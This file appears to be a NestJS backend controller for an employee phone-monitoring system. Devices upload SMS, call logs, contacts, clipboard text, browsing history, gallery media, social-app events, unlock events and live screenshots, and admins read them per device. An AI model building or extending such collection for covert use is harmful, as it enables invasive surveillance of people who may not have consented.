import {
  Body,
  Controller,
  Get,
  Header,
  Param,
  Post,
  Query,
  Request,
  Res,
  StreamableFile,
  UploadedFile,
  UseGuards,
  UseInterceptors,
} from '@nestjs/common';
import { FileInterceptor } from '@nestjs/platform-express';
import type { Response } from 'express';
import { TrackingService } from './tracking.service.js';
import {
  BatchAppUsageDto,
  BatchBrowsingHistoryDto,
  BatchCallLogDto,
  BatchContactDto,
  BatchGalleryItemDto,
  BatchSmsDto,
  BatchSocialAppEventDto,
  BatchUnlockEventDto,
  CreateAppUsageDto,
  CreateBrowsingHistoryDto,
  CreateCallLogDto,
  CreateClipboardDto,
  CreateGalleryItemDto,
  CreateScreenTimeDto,
  CreateSocialAppEventDto,
  CreateUnlockEventDto,
  QuerySocialEventsDto,
  QueryTrackingDto,
  UploadGalleryMetaDto,
} from './dto/tracking.dto.js';
import { JwtAuthGuard } from '../auth/guards/jwt-auth.guard.js';
import { DeviceJwtGuard } from '../device-auth/device-jwt.guard.js';
import { AdminGuard } from '../admin/guards/admin.guard.js';

/**
 * Tracking endpoints come in two flavors:
 *   - POST (device uploads) → DeviceJwtGuard; deviceId sourced from req.device.id
 *   - GET  (admin reads)    → JwtAuthGuard + AdminGuard; deviceId from URL
 *
 * The split keeps employee devices from reading other devices' data even if
 * a device token leaks, and keeps admin reads out of the device auth path.
 */
@Controller('tracking')
export class TrackingController {
  constructor(private tracking: TrackingService) {}

  // ─── App Usage ──────────────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('app-usage')
  createAppUsage(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateAppUsageDto,
  ) {
    return this.tracking.createAppUsage(req.device.id, dto);
  }

  @UseGuards(DeviceJwtGuard)
  @Post('app-usage/batch')
  createAppUsageBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchAppUsageDto,
  ) {
    return this.tracking.createAppUsageBatch(req.device.id, dto);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('app-usage/device/:deviceId')
  getAppUsage(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getAppUsageByDevice(deviceId, query);
  }

  // ─── Browsing History ───────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('browsing-history')
  createBrowsingHistory(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateBrowsingHistoryDto,
  ) {
    return this.tracking.createBrowsingHistory(req.device.id, dto);
  }

  @UseGuards(DeviceJwtGuard)
  @Post('browsing-history/batch')
  createBrowsingHistoryBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchBrowsingHistoryDto,
  ) {
    return this.tracking.createBrowsingHistoryBatch(req.device.id, dto);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('browsing-history/device/:deviceId')
  getBrowsingHistory(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getBrowsingHistoryByDevice(deviceId, query);
  }

  // ─── Call Logs ──────────────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('call-logs')
  createCallLog(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateCallLogDto,
  ) {
    return this.tracking.createCallLog(req.device.id, dto);
  }

  @UseGuards(DeviceJwtGuard)
  @Post('call-logs/batch')
  createCallLogBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchCallLogDto,
  ) {
    return this.tracking.createCallLogBatch(req.device.id, dto);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('call-logs/device/:deviceId')
  getCallLogs(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getCallLogsByDevice(deviceId, query);
  }

  // ─── Screen Time ────────────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('screen-time')
  createScreenTime(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateScreenTimeDto,
  ) {
    return this.tracking.createScreenTime(req.device.id, dto);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('screen-time/device/:deviceId')
  getScreenTime(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getScreenTimeByDevice(deviceId, query);
  }

  // ─── Gallery metadata ──────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('gallery')
  createGalleryItem(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateGalleryItemDto,
  ) {
    return this.tracking.createGalleryItem(req.device.id, dto);
  }

  @UseGuards(DeviceJwtGuard)
  @Post('gallery/batch')
  createGalleryItemBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchGalleryItemDto,
  ) {
    return this.tracking.createGalleryItemBatch(req.device.id, dto);
  }

  // ─── Gallery upload (multipart) ────────────────────────────────────────

  // Cap at ~100 MB to protect disk; videos above this should be chunked by
  // the client. multer buffers to memory which is OK for Phase 2; a disk
  // storage adapter is a one-line swap if we need bigger uploads later.
  @UseGuards(DeviceJwtGuard)
  @Post('gallery/upload')
  @UseInterceptors(
    FileInterceptor('file', { limits: { fileSize: 100 * 1024 * 1024 } }),
  )
  uploadGallery(
    @Request() req: { device: { id: string } },
    @UploadedFile() file: Express.Multer.File,
    @Body() meta: UploadGalleryMetaDto,
  ) {
    return this.tracking.uploadGalleryMedia(req.device.id, file, meta);
  }

  // Admin download of a stored gallery binary.
  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('gallery/:id/download')
  async downloadGallery(
    @Param('id') id: string,
    @Res({ passthrough: true }) res: Response,
  ): Promise<StreamableFile> {
    const { stream, length, filename, mimeType } =
      await this.tracking.openGalleryMedia(id);
    res.set({
      'Content-Type': mimeType || 'application/octet-stream',
      'Content-Disposition': `attachment; filename="${filename}"`,
      'Content-Length': String(length),
    });
    return new StreamableFile(stream);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('gallery/device/:deviceId')
  getGallery(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getGalleryByDevice(deviceId, query);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('gallery/:id')
  getGalleryItem(@Param('id') id: string) {
    return this.tracking.getGalleryItem(id);
  }

  // ─── SMS ────────────────────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('sms/batch')
  createSmsBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchSmsDto,
  ) {
    return this.tracking.createSmsBatch(req.device.id, dto.items);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('sms/device/:deviceId')
  getSms(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getSmsByDevice(deviceId, query);
  }

  // ─── Contacts ───────────────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('contacts/sync')
  syncContacts(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchContactDto,
  ) {
    return this.tracking.syncContacts(req.device.id, dto.items);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('contacts/device/:deviceId')
  getContacts(@Param('deviceId') deviceId: string) {
    return this.tracking.getContactsByDevice(deviceId);
  }

  // ─── Clipboard ──────────────────────────────────────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('clipboard')
  createClipboard(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateClipboardDto,
  ) {
    return this.tracking.createClipboardEntry(req.device.id, dto.content);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('clipboard/device/:deviceId')
  getClipboard(@Param('deviceId') deviceId: string) {
    return this.tracking.getClipboardByDevice(deviceId);
  }

  // ─── Unlock Event (real-time alert path) ────────────────────────────────

  // Single-event fast path: fires the WS + FCM alert immediately. The agent
  // calls this on every ACTION_USER_PRESENT.
  @UseGuards(DeviceJwtGuard)
  @Post('unlock-event')
  @Header('Cache-Control', 'no-store')
  recordUnlock(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateUnlockEventDto,
  ) {
    return this.tracking.recordUnlockEvent(req.device.id, dto);
  }

  // Backfill after reconnect; no alert fired.
  @UseGuards(DeviceJwtGuard)
  @Post('unlock-event/batch')
  recordUnlockBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchUnlockEventDto,
  ) {
    return this.tracking.recordUnlockEventsBatch(req.device.id, dto);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('unlock-events/device/:deviceId')
  getUnlockEvents(
    @Param('deviceId') deviceId: string,
    @Query() query: QueryTrackingDto,
  ) {
    return this.tracking.getUnlockEventsByDevice(deviceId, query);
  }

  // ─── Social App Events (WhatsApp/Instagram/Facebook) ────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('social-event')
  createSocialEvent(
    @Request() req: { device: { id: string } },
    @Body() dto: CreateSocialAppEventDto,
  ) {
    return this.tracking.createSocialAppEvent(req.device.id, dto);
  }

  @UseGuards(DeviceJwtGuard)
  @Post('social-event/batch')
  createSocialEventBatch(
    @Request() req: { device: { id: string } },
    @Body() dto: BatchSocialAppEventDto,
  ) {
    return this.tracking.createSocialAppEventBatch(req.device.id, dto);
  }

  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('social-events/device/:deviceId')
  getSocialEvents(
    @Param('deviceId') deviceId: string,
    @Query() query: QuerySocialEventsDto,
  ) {
    return this.tracking.getSocialAppEventsByDevice(deviceId, query);
  }

  // ─── Live Screenshot (for when Flutter is dead) ─────────────────────────

  @UseGuards(DeviceJwtGuard)
  @Post('screenshot')
  @Header('Cache-Control', 'no-store')
  async receiveScreenshot(
    @Request() req: { device: { id: string } },
    @Body() dto: { data: string; timestamp?: number },
  ) {
    return this.tracking.relayScreenshot(req.device.id, dto.data, dto.timestamp);
  }

  // Admin gets latest screenshot instantly
  @UseGuards(JwtAuthGuard, AdminGuard)
  @Get('screenshot/device/:deviceId/latest')
  @Header('Cache-Control', 'no-store')
  async getLatestScreenshot(@Param('deviceId') deviceId: string) {
    return this.tracking.getLatestScreenshot(deviceId);
  }
}
